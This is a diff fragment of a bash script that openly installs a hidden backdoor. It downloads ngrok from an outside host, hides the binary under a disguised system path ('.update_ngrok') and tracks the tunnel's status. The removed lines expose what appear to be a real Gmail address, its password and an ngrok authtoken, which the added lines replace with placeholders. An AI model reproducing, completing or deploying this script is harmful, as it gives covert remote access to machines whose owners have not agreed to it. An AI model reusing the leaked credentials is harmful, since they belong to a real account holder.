@@ -20,11 +20,11 @@ watchdog=$(cat <<'_EOF_'
 BACKDOOR_LOC=/usr/sbin/.update_ngrok/ngrok_bkdr
 the_script=$(cat << '+EOF+'
 #!/bin/bash
-EMAIL="daddycool4465765@gmail.com"
-PASSW="mathjon5555mathjon55551811199218111992mathjon5555mathjon55551811199218111992"
+EMAIL="YOUR GOOGLE MAIL"
+PASSW="YOUR GOOGLE PASSWORD"
 PING_CHECK=`until  [ $(ping -q -c 5 google.com|grep -oP "(?<=ved,).*(?=%)"|sed 's/ //g') = 0 ] ;do continue ; done`
 WGET_LINK="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
-NGROK_YML="authtoken: MYpzg8H2QqNcxhveSwiz_3tNCt8zEkuHw9vMDRx2Gp"
+NGROK_YML="authtoken: YOUR NGROK AUTHTOKEN"
 SERV="http://127.0.0.1:4040/status"
 TMPFILE=$(mktemp -t backdoor.XXXXXXXXX)
 BACKDOOR_LOC=/usr/sbin/.update_ngrok/ngrok_bkdr
